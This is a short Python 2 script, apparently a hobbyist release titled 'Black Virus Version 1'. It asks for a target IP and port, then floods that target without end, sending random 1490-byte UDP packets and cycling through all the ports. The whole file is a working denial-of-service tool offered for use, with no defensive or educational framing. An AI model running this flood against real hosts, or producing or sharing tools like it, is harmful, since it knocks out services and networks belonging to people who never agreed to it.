import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet Black Virus\n")
print "\033[1;97mBLACK VIRUS VERSION 1"
print "\033[1;97m-------------------------------------------------"
print "\033[1;97mAuthor  : \033[1;96mMR.GRIMX72"
print "\033[1;97mYoutube : \033[1;96mCANDRA-NM"
print "\033[1;97mGithub  : \033[1;96mgithub.com/candranovan"
print "\033[1;97m-------------------------------------------------\n\033[1;96m"
ip = raw_input("IP Target : ")
port = input("Port      : ")
time.sleep(5)
os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
